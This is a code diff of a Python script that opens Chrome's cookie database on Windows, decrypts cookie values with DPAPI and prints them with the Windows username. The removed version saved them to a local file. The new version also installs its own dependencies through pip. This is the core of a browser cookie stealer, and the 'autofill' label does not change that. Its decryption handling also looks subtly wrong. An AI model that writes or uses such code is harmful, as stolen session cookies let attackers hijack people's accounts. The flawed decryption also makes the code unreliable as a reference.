@@ -1,74 +1,83 @@
+import subprocess
+import sys
 import os
-import shutil
 import sqlite3
-import win32crypt  # Used for decrypting cookies on Windows
+from win32crypt import CryptUnprotectData
 
-def get_current_user():
-    """Retrieve the current logged-in user's name."""
+# Dependencies to be included in requirements.txt
+DEPENDENCIES = [
+    'pycryptodome',
+    'pywin32'
+]
+
+# Path to Chrome's cookie database
+COOKIE_DB_PATH = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
+
+def create_requirements_file():
+    """Create requirements.txt with the necessary dependencies."""
+    with open('requirements.txt', 'w') as f:
+        for package in DEPENDENCIES:
+            f.write(f"{package}\n")
+
+def install_requirements():
+    """Install required packages from requirements.txt."""
     try:
-        user = os.getlogin()
-        return user
-    except OSError as e:
-        print(f"Error retrieving user: {e}")
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while installing packages: {e}")
+        sys.exit(1)
+
+def decrypt_chrome_cookie(encrypted_value):
+    """Decrypt the encrypted data using Windows DPAPI."""
+    if encrypted_value[:3] != b'v10':
+        return None
+    
+    encrypted_value = encrypted_value[3:]
+    try:
+        decrypted_value = CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+        return decrypted_value
+    except Exception as e:
+        print(f"Failed to decrypt cookie: {e}")
         return None
 
-def get_chrome_cookies():
+def extract_cookies():
     """Extract cookies from Chrome's database."""
-    user = get_current_user()
-    if not user:
-        print("Could not retrieve the current user.")
-        return []
-
-    # Path to Chrome's Cookies database
-    chrome_cookie_path = os.path.expanduser(fr'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Cookies')
-    
-    if not os.path.exists(chrome_cookie_path):
-        print(f"Cookies database not found at {chrome_cookie_path}")
-        return []
-
-    # Temporary path for copying the Cookies database
-    temp_cookie_path = os.path.join(os.environ['TEMP'], 'Cookies')
-    
-    # Copy the Cookies database to a temporary location
-    shutil.copy2(chrome_cookie_path, temp_cookie_path)
-    
-    # Connect to the copied database
-    conn = sqlite3.connect(temp_cookie_path)
-    cursor = conn.cursor()
-    
-    # Query to fetch cookies
-    cursor.execute('SELECT name, value, encrypted_value FROM cookies')
-    cookies = cursor.fetchall()
-    
-    # Close connection and remove the temporary file
-    conn.close()
-    os.remove(temp_cookie_path)
-    
+    cookies = []
+    try:
+        conn = sqlite3.connect(COOKIE_DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('SELECT name, encrypted_value FROM cookies')
+        
+        for name, encrypted_value in cursor.fetchall():
+            value = decrypt_chrome_cookie(encrypted_value)
+            if value:
+                cookies.append((name, value.decode('utf-8')))
+        
+        conn.close()
+    except sqlite3.Error as e:
+        print(f"An error occurred while accessing the database: {e}")
+        sys.exit(1)
     return cookies
 
-def decrypt_value(encrypted_value):
-    """Decrypt the encrypted value (Windows-specific)."""
-    try:
-        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
-    except Exception as e:
-        return f"Error decrypting value: {e}"
-
-def save_cookies_to_file(cookies, folder_name='Data', filename='cookies.txt'):
-    """Create a folder and save cookies to a text file inside that folder."""
-    if not os.path.exists(folder_name):
-        os.makedirs(folder_name)
+def autofill_data(cookies):
+    """Autofill user data (dummy example)."""
+    for name, value in cookies:
+        print(f'Cookie Name: {name}, Cookie Value: {value}')
     
-    file_path = os.path.join(folder_name, filename)
-    with open(file_path, 'w') as f:
-        for name, value, encrypted_value in cookies:
-            if encrypted_value:
-                value = decrypt_value(encrypted_value)
-            f.write(f'Name: {name}\nValue: {value}\n\n')
+    # Example of filling in user data
+    windows_username = os.getlogin()
+    print(f'Windows Username: {windows_username}')
 
 if __name__ == "__main__":
-    cookies = get_chrome_cookies()
-    if cookies:
-        save_cookies_to_file(cookies)
-        print(f'Cookies have been saved to the Data folder.')
-    else:
-        print("No cookies were retrieved.")
+    # Check if requirements.txt exists, create it if not
+    if not os.path.isfile('requirements.txt'):
+        print("Creating requirements.txt...")
+        create_requirements_file()
+
+    # Install dependencies
+    install_requirements()
+
+    # Extract cookies and autofill data
+    cookies = extract_cookies()
+    autofill_data(cookies)
